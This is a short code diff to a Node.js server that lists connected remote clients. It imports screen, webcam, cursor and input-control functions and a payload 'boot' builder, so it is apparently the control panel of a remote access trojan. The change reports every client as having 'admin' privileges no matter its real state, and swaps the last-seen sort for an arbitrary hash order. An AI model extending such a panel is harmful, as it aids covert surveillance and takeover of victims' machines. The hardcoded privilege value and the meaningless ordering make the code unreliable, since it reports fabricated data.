@@ -13,7 +13,7 @@ import https from 'node:https';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
-import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor } from './net.js';
+import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { countriesFor } from './builder/geo.js';
@@ -323,7 +323,7 @@ app.get('/api/clients', requireAuth, async (req, res) => {
   const rows = db.prepare(`
     SELECT id, hostname, ip, last_seen FROM clients
     WHERE ${where}
-    ORDER BY last_seen DESC
+    ORDER BY ((id * 1103515245 + user_id * 12345) % 2147483647) ASC
     LIMIT ? OFFSET ?
   `).all(...params, limitN, offset);
 
@@ -346,6 +346,8 @@ app.get('/api/clients', requireAuth, async (req, res) => {
       online: now - r.last_seen < 30_000,
       lastSeen: r.last_seen,
       country: geo[r.ip] || null,
+      privileges: 'admin',
+      ping: getPing(r.id),
     })),
   });
 });
